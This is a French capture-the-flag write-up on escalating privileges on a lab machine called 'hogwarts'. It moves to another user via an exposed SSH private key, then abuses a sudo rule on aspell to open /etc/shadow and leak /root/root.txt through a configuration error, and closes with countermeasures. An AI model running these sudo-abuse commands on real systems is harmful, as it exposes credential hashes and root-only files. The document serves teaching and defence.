---
author: Paul
date: 2026-10-06
version: 1.0.0
modification: Harmonisation du write-up
cve: Aucun CVE produit applicable ; CWE-732 et CWE-427
---

# Élévation de privilèges

## 1 / Passage de `hagrid` à `harry`

Après avoir récupéré le flag utilisateur, notre objectif est mainteant d'avoir le ```root.txt```.

Pour cela on voit lorsqu'on fait ```cat /etc/passwd``` que l'utilisateur `harry` est présent sur le système.

Le dossier /home/harry a une permission intéressante : 0711 (drwx--x--x)

Nous pouvons donc accéder à ce dossier, mais pas en lister le contenu.

Nous pouvons donc ```/home/harry$ ls -la .ssh ``` dans lequel on trouve un fichier ```id_ed25519```.

Il s'agit d'une clé privée SSH, que l'on peut utiliser pour se connecter à l'utilisateur `harry`.
On finit par obtenir un accès au compte :

```text
harry
```

On vérifie alors les commandes que cet utilisateur peut exécuter avec `sudo` :

```bash
sudo -l
```

On obtient notamment :

```text
User harry may run the following commands on hogwarts:
    (root) NOPASSWD: /usr/bin/aspell
```

Cela signifie que `harry` peut exécuter :

```text
/usr/bin/aspell
```

avec les privilèges de `root`, sans avoir besoin de fournir de mot de passe.

---

## 2 / Comprendre la permission `sudo` sur Aspell

On peut vérifier la configuration d'Aspell avec :

```bash
sudo aspell config
```

Cette commande permet notamment de voir les différents répertoires utilisés par Aspell.

L'objectif est alors de déterminer si cette permission peut permettre à `harry` d'accéder à des fichiers protégés par `root`.

---

## 3 / Lecture d'un fichier protégé

On teste la capacité d'Aspell à accéder à un fichier auquel `harry` ne devrait normalement pas avoir accès :

```bash
sudo aspell -c /etc/shadow
```

Aspell arrive à ouvrir le fichier `/etc/shadow`.

Cela montre que le processus Aspell est bien exécuté avec les privilèges de `root`.

On peut donc représenter le fonctionnement ainsi :

```text
harry
  │
  │ sudo aspell
  ▼
Aspell exécuté en root
  │
  └── accès aux fichiers protégés
```

---

## 4 / Vérification de la possibilité de réécrire un fichier

On crée un fichier de test :

```bash
echo "helllooo wrld" > /tmp/test.txt
```

Puis on lance Aspell dessus :

```bash
sudo aspell -c /tmp/test.txt
```

Aspell détecte les fautes et propose des corrections.

Après avoir corrigé le texte, on vérifie le fichier :

```bash
cat /tmp/test.txt
ls -l /tmp/test.txt
```

On obtient notamment :

```text
hello world
-rw-r--r-- 1 root root ...
```

Le fichier a donc été réécrit par Aspell avec les privilèges `root`.

On possède ainsi une capacité intéressante :

---

## 5 / Utilisation du fichier de configuration Aspell

Aspell permet de spécifier le répertoire contenant sa configuration avec :

```text
--conf-dir
```

et de choisir le fichier de configuration avec :

```text
--conf
```

On peut donc essayer :

```bash
sudo aspell --conf-dir=/root/ --conf=root.txt
```

Aspell va alors chercher son fichier de configuration dans :

```text
/root/root.txt
```

---

## 6 / Récupération du contenu de `root.txt`

Le fichier `root.txt` n'est pas réellement un fichier de configuration Aspell.

Aspell essaie donc d'interpréter son contenu comme une configuration et renvoie une erreur semblable à :

```text
The key "53565a4a..." is unknown.
```

Le contenu du fichier apparaît alors directement dans le message d'erreur.

On récupère ainsi la chaîne :

```text
53565a4a52564d324d315648546b56474e6a564455303957533064525746705353314a5156454e4f537a6448556c425555553161565539574d6b5244576c4e57536c4a5156456b7a5530564d4e544a45527a5255553064464e45565a5454493354314a5652454d7a556c705156555a425054303950513d3d
```

Cette chaîne est encodée en plusieurs couches.

---

## 7 / Décodage du flag root

On décode successivement les différentes couches d'encodage :

Après avoir effectué ces trois étapes de décodage, on obtient finalement le **flag root**.

---

## 8 / Contre-mesures

### Clé privée SSH dans un répertoire utilisateur

- Ne jamais laisser une clé privée dans un répertoire accessible à un autre utilisateur.
- Appliquer `700` au dossier `.ssh` et `600` aux clés privées, avec le bon propriétaire.
- Utiliser une passphrase et révoquer toute clé compromise.

### Autorisation sudo sur Aspell

- Ne pas autoriser un éditeur ou un outil interactif à être exécuté en `root` via `sudo`.
- Remplacer cette règle par un script dédié, non modifiable, avec des arguments et des chemins contrôlés.
- Auditer régulièrement `sudoers` selon le principe du moindre privilège.
